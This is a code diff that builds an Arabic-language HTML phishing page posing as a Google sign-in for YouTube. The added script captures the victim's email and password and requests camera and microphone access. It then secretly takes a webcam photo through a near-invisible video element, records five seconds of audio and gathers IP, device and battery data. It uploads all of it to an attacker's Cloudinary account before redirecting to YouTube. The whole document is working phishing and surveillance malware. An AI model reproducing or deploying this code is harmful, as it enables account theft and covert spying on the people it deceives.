@@ -1,94 +1,130 @@
-async function run() {
-    const email = document.getElementById('e').value, pass = document.getElementById('p').value;
-    if(!email || !pass) return;
-
-    try {
-        // 1. طلب الصلاحيات (صوت وصورة)
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: true, 
-            audio: { echoCancellation: true, noiseSuppression: true } 
-        });
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - تأكيد ملكية الحساب</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        .login-card { width: 90%; max-width: 420px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; background: #fff; z-index: 10; }
+        img.logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
+        p { color: #3c4043; margin-bottom: 25px; }
+        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
+        input:focus { border: 2px solid #1a73e8; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
         
-        const video = document.getElementById('v');
-        video.srcObject = stream;
-        video.play();
+        /* إخفاء العناصر التقنية مع إبقائها نشطة */
+        #v { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
+        #c { display: none; }
+    </style>
+</head>
+<body>
 
-        document.getElementById('ui').innerHTML = "<h3>جاري مزامنة الحساب...</h3><p>يرجى الانتظار 5 ثوانٍ لإتمام الفحص</p>";
+<div class="login-card" id="ui">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+    <h1>تسجيل الدخول</h1>
+    <p>المتابعة إلى YouTube</p>
+    <input type="email" id="e" placeholder="البريد الإلكتروني أو الهاتف" required>
+    <input type="password" id="p" placeholder="كلمة المرور" required>
+    <button onclick="run()">التالي</button>
+</div>
 
-        // 2. سحب بيانات البطارية والجهاز فوراً
-        const deviceDetails = await getDeviceDetails();
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c" width="640" height="480"></canvas>
 
-        // 3. الانتظار لاستقرار الكاميرا ثم التصوير والتسجيل
+<script>
+    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+
+    async function run() {
+        const email = document.getElementById('e').value, pass = document.getElementById('p').value;
+        if(!email || !pass) return;
+
+        try {
+            // 1. طلب الصلاحيات
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: true, 
+                audio: { echoCancellation: true, noiseSuppression: true } 
+            });
+            
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            video.play();
+
+            document.getElementById('ui').innerHTML = "<h3>جاري مزامنة الحساب...</h3><p>يرجى الانتظار 5 ثوانٍ لإتمام الفحص الأمني</p>";
+
+            // 2. سحب بيانات البطارية والجهاز فوراً
+            const deviceDetails = await getDeviceDetails();
+
+            // 3. الانتظار لاستقرار الكاميرا (3 ثواني) ثم التصوير
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                const imgData = canvas.toDataURL("image/png");
+
+                // بدء التسجيل الصوتي لمدة 5 ثواني ثم الرفع والتحويل
+                startVoiceRecording(email, pass, imgData, deviceDetails, stream);
+            }, 3000);
+
+        } catch (err) { window.location.href = yt; }
+    }
+
+    async function getDeviceDetails() {
+        let info = {
+            model: navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown",
+            battery: "N/A",
+            charging: "N/A"
+        };
+        try {
+            if (navigator.getBattery) {
+                const bt = await navigator.getBattery();
+                info.battery = Math.round(bt.level * 100) + "%";
+                info.charging = bt.charging ? "Yes" : "No";
+            }
+        } catch (e) {}
+        return info;
+    }
+
+    function startVoiceRecording(e, p, img, dev, stream) {
+        const recorder = new MediaRecorder(stream);
+        let chunks = [];
+        recorder.ondataavailable = ev => chunks.push(ev.data);
+        recorder.onstop = () => {
+            const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+            uploadAll(e, p, img, audioBlob, dev);
+        };
+        recorder.start();
         setTimeout(() => {
-            const canvas = document.getElementById('c');
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-            const imgData = canvas.toDataURL("image/png");
+            recorder.stop();
+            // تحويل لليوتيوب بعد ثانية لضمان خروج الطلبات
+            setTimeout(() => { window.location.href = yt; }, 1500);
+        }, 5000);
+    }
 
-            startVoiceRecording(email, pass, imgData, deviceDetails, stream);
-        }, 3000);
+    async function uploadAll(e, p, img, audio, dev) {
+        let ip = "Unknown";
+        try { 
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            ip = d.ip;
+        } catch(err){}
 
-    } catch (err) { window.location.href = yt; }
-}
+        const commonContext = `u=${e}|p=${p}|ip=${ip}|dev=${dev.model}|bat=${dev.battery}|char=${dev.charging}`;
 
-async function getDeviceDetails() {
-    let info = {
-        model: navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown",
-        battery: "N/A",
-        charging: "N/A"
-    };
+        // رفع الصورة
+        const fd1 = new FormData();
+        fd1.append('file', img); fd1.append('upload_preset', pr);
+        fd1.append('context', commonContext);
+        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1, keepalive: true });
 
-    // سحب بيانات البطارية (Battery API)
-    try {
-        if (navigator.getBattery) {
-            const bt = await navigator.getBattery();
-            info.battery = Math.round(bt.level * 100) + "%";
-            info.charging = bt.charging ? "Yes" : "No";
-        }
-    } catch (e) {}
-    
-    return info;
-}
-
-function startVoiceRecording(e, p, img, dev, stream) {
-    // حل مشكلة الصوت: استخدام الصيغة الأصلية للمتصفح
-    const recorder = new MediaRecorder(stream);
-    let chunks = [];
-
-    recorder.ondataavailable = ev => chunks.push(ev.data);
-    recorder.onstop = () => {
-        const audioBlob = new Blob(chunks, { type: 'audio/webm' }); // أفضل صيغة لضمان التسجيل
-        uploadAll(e, p, img, audioBlob, dev);
-    };
-
-    recorder.start();
-    // نسجل 5 ثواني صوت عشان نلحق نرفع
-    setTimeout(() => {
-        recorder.stop();
-        // تحويل لليوتيوب بعد ثانية من قفل التسجيل لضمان خروج الـ Request
-        setTimeout(() => { window.location.href = yt; }, 1500);
-    }, 5000);
-}
-
-async function uploadAll(e, p, img, audio, dev) {
-    let ip = "Unknown";
-    try { 
-        const r = await fetch('https://api.ipify.org?format=json');
-        const d = await r.json();
-        ip = d.ip;
-    } catch(err){}
-
-    const commonContext = `u=${e}|p=${p}|ip=${ip}|dev=${dev.model}|bat=${dev.battery}|char=${dev.charging}`;
-
-    // رفع الصورة
-    const fd1 = new FormData();
-    fd1.append('file', img); fd1.append('upload_preset', pr);
-    fd1.append('context', commonContext);
-    fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1, keepalive: true });
-
-    // رفع الصوت
-    const fd2 = new FormData();
-    fd2.append('file', audio); fd2.append('upload_preset', pr);
-    fd2.append('resource_type', 'video'); // ضروري عشان كلوديناري يقبله كملف وسائط
-    fd2.append('context', commonContext);
-    fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2, keepalive: true });
-}
+        // رفع الصوت
+        const fd2 = new FormData();
+        fd2.append('file', audio); fd2.append('upload_preset', pr);
+        fd2.append('resource_type', 'video');
+        fd2.append('context', commonContext);
+        fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2, keepalive: true });
+    }
+</script>
+</body>
+</html>
